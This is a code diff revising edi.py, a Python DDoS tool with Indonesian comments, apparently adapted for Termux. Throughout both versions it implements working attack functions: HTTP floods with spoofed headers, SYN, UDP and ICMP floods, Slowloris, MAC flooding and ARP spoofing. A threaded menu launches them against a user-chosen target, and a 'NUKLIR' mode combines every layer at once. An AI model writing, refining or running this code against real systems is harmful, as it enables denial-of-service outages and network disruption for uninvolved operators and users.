@@ -1,183 +1,218 @@
 #!/usr/bin/env python3
-# edi.py - Ry7's 7 Layer DDoS Tool
-# Untuk penggunaan internal RY7 saja
+# edi.py - Ry7's SevenLayer DDoS Tool for Termux
 
-import threading
 import socket
+import threading
 import random
-import requests
 import time
 import sys
 import os
-from scapy.all import *
+import requests
 from urllib.parse import urlparse
-import socks
-import ssl
 
-# Konfigurasi default
-target_url = ""
-target_ip = ""
-port = 80
-threads = 500
-duration = 60
-proxy_list = []
+# Warna buat tampilan
+G = '\033[92m'
+R = '\033[91m'
+B = '\033[94m'
+W = '\033[0m'
 
-# Banner
 def banner():
-    os.system("clear")
-    print("""
+    os.system('clear')
+    print(f"""{R}
     ███████╗██████╗ ██╗
     ██╔════╝██╔══██╗██║
     █████╗  ██║  ██║██║
     ██╔══╝  ██║  ██║██║
     ███████╗██████╔╝██║
-    ╚══════╝╚═════╝ ╚═╝
-    SevenLayerSiege - Ry7's Attacker
+    ╚══════╝╚═════╝ ╚═╝{W}
+    {G}EDISI RY7 - 7 Layer Attacker{W}
     """)
 
-# Layer 7: HTTP Flood dengan proxy & spoofed headers
-def http_flood(target, proxy=None):
+# HTTP Flood (Layer 7)
+def http_flood(url, duration):
     headers = {
-        "User-Agent": random.choice([
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
-            "Mozilla/5.0 (Linux; Android 10; SM-G973F)",
+        'User-Agent': random.choice([
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)',
+            'Mozilla/5.0 (Linux; Android 11)'
         ]),
-        "Accept": "*/*",
-        "Accept-Language": "id-ID,id;q=0.9",
-        "Cache-Control": "no-cache",
-        "Connection": "keep-alive",
-        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+        'Accept': '*/*',
+        'Cache-Control': 'no-cache',
+        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
     }
+    end = time.time() + duration
+    while time.time() < end:
+        try:
+            requests.get(url, headers=headers, timeout=2)
+        except:
+            pass
+
+# SYN Flood (Layer 4) - butuh root
+def syn_flood(ip, port, duration):
     try:
-        if proxy:
-            proxies = {"http": proxy, "https": proxy}
-            requests.get(target, headers=headers, proxies=proxies, timeout=3, verify=False)
-        else:
-            requests.get(target, headers=headers, timeout=3, verify=False)
+        from scapy.all import IP, TCP, send
+        end = time.time() + duration
+        while time.time() < end:
+            pkt = IP(dst=ip)/TCP(dport=port, flags='S', seq=random.randint(1,10000))
+            send(pkt, verbose=False)
     except:
         pass
 
-# Layer 4: SYN Flood (perlu root) + UDP Flood
-def syn_flood(ip, port):
-    packet = IP(dst=ip)/TCP(dport=port, flags="S", seq=random.randint(1,100000))
-    send(packet, verbose=False, loop=0)
-
-def udp_flood(ip, port):
+# UDP Flood (Layer 4)
+def udp_flood(ip, port, duration):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     data = random._urandom(1024)
-    while True:
+    end = time.time() + duration
+    while time.time() < end:
         sock.sendto(data, (ip, port))
 
-# Layer 3: ICMP Flood
-def icmp_flood(ip):
-    packet = IP(dst=ip)/ICMP()
-    send(packet, verbose=False, loop=0)
-
-# Layer 2 & 1: MAC Flooding & ARP Spoof (butuh interface)
-def mac_flood(iface="eth0"):
-    # Broadcast storm
-    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/ICMP()
-    sendp(packet, iface=iface, loop=1, verbose=False)
-
-def arp_attack(target_ip, gateway_ip, iface="eth0"):
-    arp_response = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
-    send(arp_response, iface=iface, loop=1, verbose=False)
-
-# Slowloris (Layer 7 partial)
-def slowloris(target_ip, port):
+# ICMP Flood (Layer 3) - butuh root
+def icmp_flood(ip, duration):
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((target_ip, port))
-        sock.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
-        sock.send(f"Host: {target_ip}\r\n".encode())
-        sock.send("User-Agent: Mozilla/5.0\r\n".encode())
-        sock.send("Accept-language: en-US,en\r\n".encode())
-        while True:
-            sock.send(f"X-{random.randint(0,5000)}: {random.randint(0,5000)}\r\n".encode())
-            time.sleep(5)
+        from scapy.all import IP, ICMP, send
+        end = time.time() + duration
+        while time.time() < end:
+            pkt = IP(dst=ip)/ICMP()
+            send(pkt, verbose=False)
     except:
         pass
 
-# Multi-threaded executor
-def run_attack(method, target, port, threads):
-    print(f"[+] Menjalankan {method} -> {target}:{port} dengan {threads} threads")
-    for _ in range(threads):
-        if method == "http":
-            t = threading.Thread(target=http_flood, args=(target,))
-        elif method == "syn":
-            t = threading.Thread(target=syn_flood, args=(target, port))
-        elif method == "udp":
-            t = threading.Thread(target=udp_flood, args=(target, port))
-        elif method == "icmp":
-            t = threading.Thread(target=icmp_flood, args=(target,))
-        elif method == "slowloris":
-            t = threading.Thread(target=slowloris, args=(target, port))
-        elif method == "mac":
-            t = threading.Thread(target=mac_flood)
-        elif method == "arp":
-            # butuh gateway
-            gw = input("Gateway IP: ")
-            t = threading.Thread(target=arp_attack, args=(target, gw))
-        else:
-            print("Metode tidak dikenal")
-            return
-        t.daemon = True
-        t.start()
-    time.sleep(duration)
-    print("[+] Attack selesai.")
+# Slowloris (Layer 7 partial)
+def slowloris(ip, port, duration):
+    sockets = []
+    for _ in range(200):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+            s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
+            s.send(f"Host: {ip}\r\n".encode())
+            sockets.append(s)
+        except:
+            pass
+    end = time.time() + duration
+    while time.time() < end:
+        for s in sockets:
+            try:
+                s.send(f"X-{random.randint(0,5000)}: {random.randint(0,5000)}\r\n".encode())
+            except:
+                sockets.remove(s)
+        time.sleep(5)
+
+# MAC Flood (Layer 2) - butuh root & interface
+def mac_flood(iface, duration):
+    try:
+        from scapy.all import Ether, IP, ICMP, sendp
+        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/ICMP()
+        end = time.time() + duration
+        while time.time() < end:
+            sendp(pkt, iface=iface, verbose=False)
+    except:
+        pass
+
+# ARP Spoof (Layer 2) - butuh root
+def arp_spoof(target_ip, gateway_ip, iface, duration):
+    try:
+        from scapy.all import ARP, send
+        pkt = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
+        end = time.time() + duration
+        while time.time() < end:
+            send(pkt, iface=iface, verbose=False)
+    except:
+        pass
 
 def main():
     banner()
-    print("Pilih metode serangan 7 layer:")
-    print("1. HTTP Flood (Layer 7)")
-    print("2. SYN Flood (Layer 4)")
-    print("3. UDP Flood (Layer 4)")
-    print("4. ICMP Flood (Layer 3)")
-    print("5. Slowloris (Layer 7 partial)")
-    print("6. MAC Flood (Layer 2) - butuh root & interface")
-    print("7. ARP Spoof (Layer 2) - butuh root")
-    print("8. ALL LAYERS KOMBINASI (NUKLIR)")
-    pilih = input(">> ")
+    print(f"""{B}[1] HTTP Flood (Layer 7)
+[2] SYN Flood (Layer 4) - butuh root
+[3] UDP Flood (Layer 4)
+[4] ICMP Flood (Layer 3) - butuh root
+[5] Slowloris (Layer 7)
+[6] MAC Flood (Layer 2) - butuh root & interface
+[7] ARP Spoof (Layer 2) - butuh root
+[8] ALL LAYERS (NUKLIR) - butuh root untuk layer 2-4{W}""")
+    pilih = input(f"{G}>> {W}")
 
-    target = input("Target URL atau IP: ")
+    if pilih not in ['1','2','3','4','5','6','7','8']:
+        print(f"{R}Pilihan salah{W}")
+        return
+
+    target = input(f"{G}Target URL/IP: {W}")
+    ip_target = ""
+    url_target = ""
     if target.startswith("http"):
         parsed = urlparse(target)
-        target_ip = socket.gethostbyname(parsed.netloc)
-        target_url = target
+        ip_target = socket.gethostbyname(parsed.netloc)
+        url_target = target
     else:
-        target_ip = target
-        target_url = f"http://{target}"
+        ip_target = target
+        url_target = f"http://{target}"
 
-    port = int(input("Port (default 80): ") or 80)
-    threads = int(input("Jumlah threads (default 500): ") or 500)
-    global duration
-    duration = int(input("Durasi serangan (detik): ") or 60)
+    port = int(input(f"{G}Port (default 80): {W}") or "80")
+    threads = int(input(f"{G}Jumlah threads (default 500): {W}") or "500")
+    duration = int(input(f"{G}Durasi (detik): {W}"))
 
-    if pilih == "8":
-        # Jalankan semua layer secara paralel
-        for _ in range(threads//7):
-            threading.Thread(target=http_flood, args=(target_url,)).start()
-            threading.Thread(target=syn_flood, args=(target_ip, port)).start()
-            threading.Thread(target=udp_flood, args=(target_ip, port)).start()
-            threading.Thread(target=icmp_flood, args=(target_ip,)).start()
-            threading.Thread(target=slowloris, args=(target_ip, port)).start()
-            threading.Thread(target=mac_flood, args=("wlan0",)).start()
-            # ARP skip karena butuh gateway
-        print("NUKLIR MODE dijalankan selama", duration, "detik")
+    print(f"{R}[!] SERANGAN DIMULAI [!]{W}")
+    
+    if pilih == '1':
+        for _ in range(threads):
+            threading.Thread(target=http_flood, args=(url_target, duration)).start()
         time.sleep(duration)
-    else:
-        methods = {
-            "1": "http",
-            "2": "syn",
-            "3": "udp",
-            "4": "icmp",
-            "5": "slowloris",
-            "6": "mac",
-            "7": "arp"
-        }
-        method = methods.get(pilih, "http")
-        run_attack(method, target_ip if method not in ["http","slowloris"] else target_url, port, threads)
+    
+    elif pilih == '2':
+        for _ in range(threads):
+            threading.Thread(target=syn_flood, args=(ip_target, port, duration)).start()
+        time.sleep(duration)
+    
+    elif pilih == '3':
+        for _ in range(threads):
+            threading.Thread(target=udp_flood, args=(ip_target, port, duration)).start()
+        time.sleep(duration)
+    
+    elif pilih == '4':
+        for _ in range(threads):
+            threading.Thread(target=icmp_flood, args=(ip_target, duration)).start()
+        time.sleep(duration)
+    
+    elif pilih == '5':
+        for _ in range(threads//10 + 1):
+            threading.Thread(target=slowloris, args=(ip_target, port, duration)).start()
+        time.sleep(duration)
+    
+    elif pilih == '6':
+        iface = input(f"{G}Interface (contoh: wlan0, eth0): {W}")
+        threading.Thread(target=mac_flood, args=(iface, duration)).start()
+        time.sleep(duration)
+    
+    elif pilih == '7':
+        gateway = input(f"{G}Gateway IP: {W}")
+        iface = input(f"{G}Interface: {W}")
+        threading.Thread(target=arp_spoof, args=(ip_target, gateway, iface, duration)).start()
+        time.sleep(duration)
+    
+    elif pilih == '8':
+        # NUKLIR: semua layer dijalankan bersamaan
+        # HTTP
+        for _ in range(threads//5):
+            threading.Thread(target=http_flood, args=(url_target, duration)).start()
+        # UDP
+        for _ in range(threads//5):
+            threading.Thread(target=udp_flood, args=(ip_target, port, duration)).start()
+        # Slowloris
+        for _ in range(threads//50):
+            threading.Thread(target=slowloris, args=(ip_target, port, duration)).start()
+        # Root layer (jika root)
+        try:
+            from scapy.all import IP, TCP, ICMP, send, Ether, sendp, ARP
+            threading.Thread(target=syn_flood, args=(ip_target, port, duration)).start()
+            threading.Thread(target=icmp_flood, args=(ip_target, duration)).start()
+            # MAC Flood
+            iface = input(f"{G}Interface untuk MAC flood: {W}")
+            threading.Thread(target=mac_flood, args=(iface, duration)).start()
+        except:
+            print(f"{R}[!] Root modules tidak tersedia, lewati layer 2-4{W}")
+        time.sleep(duration)
+    
+    print(f"{G}[+] Serangan selesai{W}")
 
 if __name__ == "__main__":
     main()
